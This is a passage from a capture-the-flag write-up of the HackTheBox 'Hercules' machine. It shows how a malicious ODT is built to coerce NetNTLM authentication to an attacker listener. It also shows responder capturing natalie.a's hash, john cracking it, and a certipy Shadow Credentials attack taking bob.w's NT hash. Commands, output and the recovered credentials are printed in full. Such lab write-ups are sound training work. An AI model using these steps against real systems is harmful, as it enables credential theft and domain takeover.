+<p>Two things stand out. First, the upload is gated behind exactly the <code>User.IsInRole(&quot;Web Administrators&quot;)</code> check we just satisfied with our forged ticket. Second, it only accepts <code>.docx</code> and <code>.odt</code> documents. Combined with the earlier mailbox hint about <em>Natalie processing reports</em>, this points squarely at a document-based <strong>NetNTLM coercion</strong> attack — we upload a booby-trapped office document that reaches out to us over SMB when it’s opened by whoever reviews the reports.</p>
+<h2 id="Coercing-natalie-a-via-a-Malicious-ODF-Document"><a href="#Coercing-natalie-a-via-a-Malicious-ODF-Document" class="headerlink" title="Coercing natalie.a via a Malicious ODF Document"></a>Coercing natalie.a via a Malicious ODF Document</h2><p>To build the malicious document we use <a class="link"   target="_blank" rel="noopener" href="https://github.com/lof1sec/Bad-ODF" >Bad-ODF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>, which crafts an ODT that references a remote resource on our attacker box, forcing the victim’s client to authenticate to us over SMB and leak their NetNTLMv2 hash:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ python3 odt.py                                                                                 </span><br><span class="line"></span><br><span class="line">    ____            __      ____  ____  ______</span><br><span class="line">   / __ )____ _____/ /     / __ \/ __ \/ ____/</span><br><span class="line">  / __  / __ `/ __  /_____/ / / / / / / /_    </span><br><span class="line"> / /_/ / /_/ / /_/ /_____/ /_/ / /_/ / __/    </span><br><span class="line">/_____/\__,_/\__,_/      \____/_____/_/     </span><br><span class="line"></span><br><span class="line">Create a malicious ODF document help leak NetNTLM Creds</span><br><span class="line"></span><br><span class="line">By Richard Davy </span><br><span class="line">@rd_pentest</span><br><span class="line"></span><br><span class="line">Please enter IP of listener: 10.10.16.6</span><br></pre></td></tr></table></figure></div>
+
+<p>We start <code>responder</code> to catch the incoming authentication:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ sudo responder -I tun0              </span><br><span class="line">                                         __</span><br><span class="line">  .----.-----.-----.-----.-----.-----.--|  |.-----.----.</span><br><span class="line">  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|</span><br><span class="line">  |__| |_____|_____|   __|_____|__|__|_____||_____|__|</span><br><span class="line">                   |__|</span><br><span class="line"></span><br><span class="line">           NBT-NS, LLMNR &amp; MDNS Responder 3.1.6.0</span><br><span class="line"></span><br><span class="line">[+] Listening for events...</span><br></pre></td></tr></table></figure></div>
+
+<p>Then we upload the ODT through the Report Submission form:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Hercules/report-submitted.png"
+                      alt="report submitted"
+                ><figcaption>report submitted</figcaption></figure></p>
+<p>A short while later — once the report is “processed” — <code>responder</code> catches a NetNTLMv2 hash for <code>natalie.a</code>, exactly the support user the emails pointed us at:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[SMB] NTLMv2-SSP Client   : 10.129.191.240</span><br><span class="line">[SMB] NTLMv2-SSP Username : HERCULES\natalie.a</span><br><span class="line">[SMB] NTLMv2-SSP Hash     : natalie.a::HERCULES:210c22c4cc0639f0:F2A4CB18386647321D67ADC700121FAC:0101000000000000001B983CFE42DC0173D1A9E9B6FAD33600000000020008005100480053004E0001001E00570049004E002D00530052004600390052004D004400590048003500560004003400570049004E002D00530052004600390052004D00440059004800350056002E005100480053004E002E004C004F00430041004C...</span><br></pre></td></tr></table></figure></div>
+
+<p>We drop the hash into <code>john</code> and crack it against <code>rockyou.txt</code>:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ john --wordlist=/usr/share/wordlists/rockyou.txt hash</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])</span><br><span class="line">Will run 6 OpenMP threads</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">Prettyprincess123! (natalie.a)     </span><br><span class="line">1g 0:00:00:04 DONE (2025-10-22 02:50) 0.2415g/s 2589Kp/s 2589Kc/s 2589KC/s Princess&lt;3..Pongo27</span><br><span class="line">Session completed.</span><br></pre></td></tr></table></figure></div>
+
+<p>We now have a second, more capable set of credentials: <code>natalie.a:Prettyprincess123!</code>.</p>
+<h2 id="BloodHound-—-Mapping-the-Path-to-bob-w"><a href="#BloodHound-—-Mapping-the-Path-to-bob-w" class="headerlink" title="BloodHound — Mapping the Path to bob.w"></a>BloodHound — Mapping the Path to bob.w</h2><p>With domain credentials that authenticate over LDAP, we collect BloodHound data with NetExec. A small but important detail on this box: use Kerberos authentication (<code>-k</code>) and feed the results into <strong>BloodHound Legacy</strong> for the analysis:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ nxc ldap hercules.htb -u natalie.a -p &#x27;Prettyprincess123!&#x27; --bloodhound --collection All --dns-server 10.129.191.240 -k </span><br><span class="line">LDAP        hercules.htb    389    DC               [*] None (name:DC) (domain:hercules.htb)</span><br><span class="line">LDAP        hercules.htb    389    DC               [+] hercules.htb\natalie.a:Prettyprincess123! </span><br><span class="line">LDAP        hercules.htb    389    DC               Resolved collection methods: group, acl, dcom, container, psremote, session, objectprops, rdp, trusts, localadmin</span><br><span class="line">LDAP        hercules.htb    389    DC               Using kerberos auth without ccache, getting TGT</span><br><span class="line">LDAP        hercules.htb    389    DC               Done in 01M 24S</span><br><span class="line">LDAP        hercules.htb    389    DC               Compressing output into /home/kali/.nxc/logs/DC_hercules.htb_2025-10-22_044014_bloodhound.zip</span><br></pre></td></tr></table></figure></div>
+
+<p>Importing the data and marking <code>natalie.a</code> as owned, BloodHound reveals a clean privilege escalation path: <code>natalie.a</code> is a member of <strong>WEB SUPPORT</strong>, which holds <strong>GenericWrite</strong> over <code>bob.w</code>, who in turn is a member of <strong>RECRUITMENT MANAGERS</strong>:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Hercules/bloodhound-path.png"
+                      alt="BloodHound path to bob.w"
+                ><figcaption>BloodHound path to bob.w</figcaption></figure></p>
+<p><code>GenericWrite</code> over a user object is more than enough to take that account over. The cleanest modern technique here is a <strong>Shadow Credentials</strong> attack — we write a Key Credential to <code>bob.w</code>‘s <code>msDS-KeyCredentialLink</code> attribute, then authenticate as them via PKINIT to pull their NT hash.</p>
+<h2 id="Shadow-Credentials-Attack-on-bob-w"><a href="#Shadow-Credentials-Attack-on-bob-w" class="headerlink" title="Shadow Credentials Attack on bob.w"></a>Shadow Credentials Attack on bob.w</h2><p>First we request a TGT for <code>natalie.a</code> so Certipy can authenticate over Kerberos:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/hercules]</span><br><span class="line">└─$ impacket-getTGT hercules.htb/&#x27;natalie.a&#x27;:&#x27;Prettyprincess123!&#x27; -dc-ip 10.129.191.240</span><br><span class="line">Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Saving ticket in natalie.a.ccache</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/hercules]</span><br><span class="line">└─$ export KRB5CCNAME=natalie.a.ccache</span><br></pre></td></tr></table></figure></div>
+
+<p>Then we let <code>certipy-ad shadow auto</code> handle the entire flow — adding the Key Credential, authenticating as <code>bob.w</code>, retrieving the hash, and restoring the original attribute so we don’t leave a mess behind:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ certipy-ad shadow auto -u natalie.a@hercules.htb -k -dc-host DC.hercules.htb -account bob.w      </span><br><span class="line">Certipy v5.0.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Targeting user &#x27;bob.w&#x27;</span><br><span class="line">[*] Generating certificate</span><br><span class="line">[*] Certificate generated</span><br><span class="line">[*] Generating Key Credential</span><br><span class="line">[*] Key Credential generated with DeviceID &#x27;2e95c3f8-50c8-e65d-18a7-da9b86257bdc&#x27;</span><br><span class="line">[*] Adding Key Credential with device ID &#x27;2e95c3f8-50c8-e65d-18a7-da9b86257bdc&#x27; to the Key Credentials for &#x27;bob.w&#x27;</span><br><span class="line">[*] Successfully added Key Credential with device ID &#x27;2e95c3f8-50c8-e65d-18a7-da9b86257bdc&#x27; to the Key Credentials for &#x27;bob.w&#x27;</span><br><span class="line">[*] Authenticating as &#x27;bob.w&#x27; with the certificate</span><br><span class="line">[*] Using principal: &#x27;bob.w@hercules.htb&#x27;</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saving credential cache to &#x27;bob.w.ccache&#x27;</span><br><span class="line">[*] Trying to retrieve NT hash for &#x27;bob.w&#x27;</span><br><span class="line">[*] Restoring the old Key Credentials for &#x27;bob.w&#x27;</span><br><span class="line">[*] Successfully restored the old Key Credentials for &#x27;bob.w&#x27;</span><br><span class="line">[*] NT hash for &#x27;bob.w&#x27;: 8a65c74e8f0073babbfac6725c66cc3f</span><br></pre></td></tr></table></figure></div>
+
+<p>And there it is — we’ve fully compromised <code>bob.w</code> and recovered their NT hash <code>8a65c74e8f0073babbfac6725c66cc3f</code>, along with a TGT saved to <code>bob.w.ccache</code>. From here we’ve pivoted from an anonymous web visitor all the way into a domain account that sits inside the <strong>Recruitment Managers</strong> group, ready to continue our path toward the top of the domain.</p>
+<h2 id="Key-Takeaways"><a href="#Key-Takeaways" class="headerlink" title="Key Takeaways"></a>Key Takeaways</h2><ul>
+<li><strong>LDAP injection in authentication forms</strong> turns a login page into a directory read primitive. Combined with the bad habit of storing passwords in the AD <code>description</code> attribute, a single injectable field leaked a working domain credential.</li>
+<li><strong>Never disclose your ASP.NET <code>machineKey</code>.</strong> Once the <code>web.config</code> leaks through a trivial path traversal, the <code>machineKey</code> lets an attacker forge arbitrary signed Forms Authentication tickets — including elevated roles — completely bypassing the login flow.</li>
+<li><strong>File-upload forms that accept office documents are coercion vectors.</strong> An allowlist of <code>.docx</code>&#x2F;<code>.odt</code> is not a security control; a malicious ODF happily coerced NetNTLMv2 authentication from the user reviewing the reports.</li>
+<li><strong><code>GenericWrite</code> over a user object is game over for that account.</strong> A Shadow Credentials attack cleanly converts that ACL into the target’s NT hash and a Kerberos ticket, with the original attribute restored afterward.</li>
+</ul>
+<p>That was it for Hercules, hope you learned something new!</p>
+<p>-0xkujen</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Hackthebox: Hercules</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2026-09-24 14:12:00</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2026-09-24 21:12:59
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kujen5.github.io/2026/09/24/Hackthebox-Hercules/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/Kerberos/">#Kerberos</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/Active-Directory/">#Active Directory</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/LFI/">#LFI</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/LDAP-Injection/">#LDAP Injection</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/ASP-NET-machineKey/">#ASP.NET machineKey</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/Forged-Auth-Ticket/">#Forged Auth Ticket</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/dnSpy/">#dnSpy</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/NTLM-Coercion/">#NTLM Coercion</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/Responder/">#Responder</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/BloodHound/">#BloodHound</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/Shadow-Credentials/">#Shadow Credentials</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/Certipy/">#Certipy</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2026/09/17/PwnSec-CTF-Meridian/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">PwnSec CTF 2026: Meridian</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Hackthebox: Hercules</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Username-Enumeration"><span class="nav-text">Username Enumeration</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LDAP-Injection-%E2%80%94-Leaking-the-description-Attribute"><span class="nav-text">LDAP Injection — Leaking the description Attribute</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Password-Spraying"><span class="nav-text">Password Spraying</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Portal-Access-as-ken-w"><span class="nav-text">Portal Access as ken.w</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Local-File-Inclusion-via-the-Download-Endpoint"><span class="nav-text">Local File Inclusion via the Download Endpoint</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Forging-a-Web-Administrators-Auth-Ticket"><span class="nav-text">Forging a Web Administrators Auth Ticket</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Decompiling-the-Application-DLL"><span class="nav-text">Decompiling the Application DLL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Coercing-natalie-a-via-a-Malicious-ODF-Document"><span class="nav-text">Coercing natalie.a via a Malicious ODF Document</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BloodHound-%E2%80%94-Mapping-the-Path-to-bob-w"><span class="nav-text">BloodHound — Mapping the Path to bob.w</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Shadow-Credentials-Attack-on-bob-w"><span class="nav-text">Shadow Credentials Attack on bob.w</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Key-Takeaways"><span class="nav-text">Key Takeaways</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
